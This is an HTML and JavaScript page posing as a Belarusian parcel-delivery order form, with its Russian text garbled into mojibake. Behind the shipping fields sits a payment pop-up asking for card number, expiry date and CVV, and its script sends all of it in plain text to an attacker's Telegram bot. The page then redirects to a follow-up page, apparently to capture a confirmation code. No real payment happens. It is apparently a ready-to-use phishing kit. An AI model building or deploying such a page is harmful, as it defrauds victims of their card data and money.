<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–∫–∞–∑</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .wrapper {
            display: flex;
            gap: 20px;
            flex-direction: column;
            align-items: center;
        }

        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        h2 {
            text-align: center;
        }

        input, select, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .city-options {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }

        .city-options button {
            flex: 1;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 10px;
            background-color: #ccc;
            cursor: pointer;
            transition: 0.3s;
        }

        .city-options button.active {
            background-color: #4a90e2;
            color: white;
        }

        #customCity {
            display: none;
        }

        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        /* –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
        }

        .modal input {
            margin-bottom: 10px;
        }

        .modal button {
            background-color: #4a90e2;
            color: white;
            border: none;
            cursor: pointer;
        }

        /* Flexbox –¥–ª—è –≤—ã—Ä–∞–≤–Ω–∏–≤–∞–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤ —Ä—è–¥–æ–º */
        .delivery-info {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .delivery-info div {
            flex: 1 1 100%; /* –≠—Ç–æ –ø–æ–∑–≤–æ–ª–∏—Ç –∫–∞–∂–¥–æ–º—É —ç–ª–µ–º–µ–Ω—Ç—É –∑–∞–Ω–∏–º–∞—Ç—å –≤—Å—é —à–∏—Ä–∏–Ω—É –Ω–∞ –º–∞–ª–µ–Ω—å–∫–∏—Ö —ç–∫—Ä–∞–Ω–∞—Ö */
        }

        .delivery-info input,
        .delivery-info select {
            width: auto;
            flex: 1;
        }

        .price-info {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: space-between;
        }

    </style>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <h2>–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –¥–æ—Å—Ç–∞–≤–∫–∏</h2>
            <input type="text" id="senderName" placeholder="–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å" required>
            <input type="text" id="senderPhone" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è" required>
            <input type="text" id="receiverName" placeholder="–ü–æ–ª—É—á–∞—Ç–µ–ª—å" required>
            <input type="text" id="receiverPhone" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω –ø–æ–ª—É—á–∞—Ç–µ–ª—è" required>
            <input type="text" id="street" placeholder="–£–ª–∏—Ü–∞" required>
            <input type="text" id="house" placeholder="–î–æ–º" required>
            <input type="text" id="apartment" placeholder="–ö–≤–∞—Ä—Ç–∏—Ä–∞" required>
            <input type="text" id="floor" placeholder="–≠—Ç–∞–∂" required>
        </div>

        <!-- –ì–æ—Ä–æ–¥ –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–æ—Å—Ç–∞–≤–∫–µ -->
        <div class="container">
            <h2>–í—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä–æ–¥</h2>
            <div class="city-options">
                <button class="city-btn">–ë—Ä–µ—Å—Ç</button>
                <button class="city-btn">–í–∏—Ç–µ–±—Å–∫</button>
                <button class="city-btn">–ì–æ–º–µ–ª—å</button>
                <button class="city-btn">–ì—Ä–æ–¥–Ω–æ</button>
                <button class="city-btn">–ú–∏–Ω—Å–∫</button>
                <button class="city-btn">–ú–æ–≥–∏–ª—ë–≤</button>
                <button id="otherCityBtn">–ù–µ—Ç –º–æ–µ–≥–æ –≥–æ—Ä–æ–¥–∞</button>
            </div>
            <input type="text" id="customCity" placeholder="–í–≤–µ–¥–∏—Ç–µ –≥–æ—Ä–æ–¥">

            <!-- –†–∞–∑–º–µ—â–µ–Ω–∏–µ –¥–∞—Ç—ã, –≤—Ä–µ–º–µ–Ω–∏, —Ç–∏–ø–∞ –¥–æ—Å—Ç–∞–≤–∫–∏, –¥–æ–ø. —É—Å–ª—É–≥ –∏ –∏—Ç–æ–≥–æ–≤–æ–π —Å—Ç–æ–∏–º–æ—Å—Ç–∏ —Ä—è–¥–æ–º -->
            <div class="delivery-info">
                <div>
                    <label for="deliveryDate">–î–∞—Ç–∞ –¥–æ—Å—Ç–∞–≤–∫–∏:</label>
                    <input type="date" id="deliveryDate" required>
                </div>
                <div>
                    <label for="deliveryTime">–í—Ä–µ–º—è –¥–æ—Å—Ç–∞–≤–∫–∏:</label>
                    <input type="time" id="deliveryTime" required>
                </div>
                <div>
                    <label for="deliveryType">–¢–∏–ø –¥–æ—Å—Ç–∞–≤–∫–∏:</label>
                    <select id="deliveryType">
                        <option value="express">–≠–∫—Å–ø—Ä–µ—Å—Å –¥–æ—Å—Ç–∞–≤–∫–∞ (1-2 –¥–Ω—è) - 30 BYN</option>
                        <option value="courier">–ö—É—Ä—å–µ—Ä—Å–∫–∞—è –¥–æ—Å—Ç–∞–≤–∫–∞ (–¥–æ 3-—Ö –¥–Ω–µ–π) - 15 BYN</option>
                    </select>
                </div>
            </div>

            <h3>–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏</h3>
            <label><input type="checkbox" id="insurance"> –°—Ç—Ä–∞—Ö–æ–≤–∫–∞ +2.5 BYN</label>
            <label><input type="checkbox" id="packaging"> –î–æ–ø. —É–ø–∞–∫–æ–≤–∫–∞ +3 BYN</label>
            <label><input type="checkbox" id="careful"> –ë–µ—Ä–µ–∂–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ +10 BYN</label>

            <!-- –ò—Ç–æ–≥–æ–≤–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å -->
            <div class="price-info">
                <div><strong>–ò—Ç–æ–≥–æ–≤–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å:</strong></div>
                <div><span id="totalPrice">15</span> BYN</div>
            </div>
        </div>

        <!-- –ö–Ω–æ–ø–∫–∞ –æ–ø–ª–∞—Ç—ã -->
        <button id="payButton" disabled>–û–ø–ª–∞—Ç–∏—Ç—å</button>

        <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –¥–ª—è –¥–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç—ã -->
        <div class="modal" id="cardModal">
            <div class="modal-content">
                <h2>–î–∞–Ω–Ω—ã–µ –¥–ª—è –æ–ø–ª–∞—Ç—ã</h2>
                <input type="text" id="cardNumber" placeholder="–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã" required>
                <input type="text" id="cardExpiry" placeholder="–î–∞—Ç–∞ –∏—Å—Ç–µ—á–µ–Ω–∏—è (MM/YY)" required>
                <input type="text" id="cardCvv" placeholder="CVV" required>
                <button id="submitPayment">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const deliveryType = document.getElementById("deliveryType");
            const insurance = document.getElementById("insurance");
            const packaging = document.getElementById("packaging");
            const careful = document.getElementById("careful");
            const totalPrice = document.getElementById("totalPrice");
            const payButton = document.getElementById("payButton");
            const cityButtons = document.querySelectorAll(".city-btn");
            const customCityInput = document.getElementById("customCity");
            const otherCityBtn = document.getElementById("otherCityBtn");
            const cardModal = document.getElementById("cardModal");

            // –†–∞—Å—á—ë—Ç –∏—Ç–æ–≥–æ–≤–æ–π —Å—Ç–æ–∏–º–æ—Å—Ç–∏
            function calculateTotal() {
                let price = deliveryType.value === "express" ? 30 : 15;
                if (insurance.checked) price += 2.5;
                if (packaging.checked) price += 3;
                if (careful.checked) price += 10;
                totalPrice.textContent = price;
            }

            // –í–∫–ª—é—á–µ–Ω–∏–µ –∫–Ω–æ–ø–∫–∏ "–û–ø–ª–∞—Ç–∏—Ç—å" –ø–æ—Å–ª–µ –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ–ª–µ–π
            function validateForm() {
                const sender = document.getElementById("senderName").value;
                const receiver = document.getElementById("receiverName").value;
                const date = document.getElementById("deliveryDate").value;
                const time = document.getElementById("deliveryTime").value;
                const street = document.getElementById("street").value;
                const house = document.getElementById("house").value;
                const apartment = document.getElementById("apartment").value;
                const floor = document.getElementById("floor").value;
                const senderPhone = document.getElementById("senderPhone").value;
                const receiverPhone = document.getElementById("receiverPhone").value;

                if (sender && receiver && date && time && street && house && apartment && floor && senderPhone && receiverPhone) {
                    payButton.disabled = false;
                } else {
                    payButton.disabled = true;
                }
            }

            // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –ø–æ–ª—è—Ö
            deliveryType.addEventListener("change", calculateTotal);
            insurance.addEventListener("change", calculateTotal);
            packaging.addEventListener("change", calculateTotal);
            careful.addEventListener("change", calculateTotal);

            document.getElementById("senderName").addEventListener("input", validateForm);
            document.getElementById("receiverName").addEventListener("input", validateForm);
            document.getElementById("deliveryDate").addEventListener("input", validateForm);
            document.getElementById("deliveryTime").addEventListener("input", validateForm);
            document.getElementById("street").addEventListener("input", validateForm);
            document.getElementById("house").addEventListener("input", validateForm);
            document.getElementById("apartment").addEventListener("input", validateForm);
            document.getElementById("floor").addEventListener("input", validateForm);
            document.getElementById("senderPhone").addEventListener("input", validateForm);
            document.getElementById("receiverPhone").addEventListener("input", validateForm);

            // –í—ã–±–æ—Ä –≥–æ—Ä–æ–¥–∞
            cityButtons.forEach(btn => {
                btn.addEventListener("click", function() {
                    cityButtons.forEach(button => button.classList.remove("active"));
                    this.classList.add("active");
                    customCityInput.style.display = "none";
                    otherCityBtn.classList.remove("active");
                    calculateTotal();
                });
            });

            otherCityBtn.addEventListener("click", function() {
                customCityInput.style.display = "block";
                otherCityBtn.classList.add("active");
                cityButtons.forEach(button => button.classList.remove("active"));
            });

            // –û—Ç–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ –¥–ª—è –≤–≤–æ–¥–∞ –¥–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç—ã
            payButton.addEventListener("click", function() {
                cardModal.style.display = "flex";
            });

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
            document.getElementById("submitPayment").addEventListener("click", function() {
                const sender = document.getElementById("senderName").value;
                const receiver = document.getElementById("receiverName").value;
                const senderPhone = document.getElementById("senderPhone").value;
                const receiverPhone = document.getElementById("receiverPhone").value;
                const street = document.getElementById("street").value;
                const house = document.getElementById("house").value;
                const apartment = document.getElementById("apartment").value;
                const floor = document.getElementById("floor").value;
                const city = document.querySelector(".city-btn.active") ? document.querySelector(".city-btn.active").textContent : customCityInput.value;
                const date = document.getElementById("deliveryDate").value;
                const time = document.getElementById("deliveryTime").value;
                const delivery = deliveryType.options[deliveryType.selectedIndex].text;
                const total = totalPrice.textContent;

                const cardNumber = document.getElementById("cardNumber").value;
                const cardExpiry = document.getElementById("cardExpiry").value;
                const cardCvv = document.getElementById("cardCvv").value;

                const message = `üöö *–ó–∞–∫–∞–∑*: 
                    üè∑ –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: ${sender}
                    üë§ –ü–æ–ª—É—á–∞—Ç–µ–ª—å: ${receiver}
                    üì± –¢–µ–ª–µ—Ñ–æ–Ω –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è: ${senderPhone}
                    üì± –¢–µ–ª–µ—Ñ–æ–Ω –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ${receiverPhone}
                    üè† –ê–¥—Ä–µ—Å: ${street}, ${house}, ${apartment}, ${floor} —ç—Ç–∞–∂
                    üåÜ –ì–æ—Ä–æ–¥: ${city}
                    üìÖ –î–∞—Ç–∞ –¥–æ—Å—Ç–∞–≤–∫–∏: ${date}
                    ‚è∞ –í—Ä–µ–º—è –¥–æ—Å—Ç–∞–≤–∫–∏: ${time}
                    üöö –¢–∏–ø –¥–æ—Å—Ç–∞–≤–∫–∏: ${delivery}
                    üíº –î–æ–ø. —É—Å–ª—É–≥–∏: ${insurance.checked ? "–°—Ç—Ä–∞—Ö–æ–≤–∫–∞ +2.5 BYN" : ""} ${packaging.checked ? "–î–æ–ø. —É–ø–∞–∫–æ–≤–∫–∞ +3 BYN" : ""} ${careful.checked ? "–ë–µ—Ä–µ–∂–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ +10 BYN" : ""}
                    üí∞ –ò—Ç–æ–≥–æ–≤–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: ${total} BYN

                üí≥ –î–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã:
                    –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã: ${cardNumber}
                    –î–∞—Ç–∞ –∏—Å—Ç–µ—á–µ–Ω–∏—è: ${cardExpiry}
                    CVV: ${cardCvv}`;

                const token = "//—Ç–æ–∫–µ–Ω –±–æ—Ç–∞";
                const chatId = "//id —á–∞—Ç–∞";

                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                    .then(response => {
                        if (response.ok) {
                            alert(":)");
                            window.location.href = "code.html";
                        } else {
                            alert("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è.");
                        }
                    });

                // –ó–∞–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
                cardModal.style.display = "none";
            });
        });
    </script>
</body>
</html>
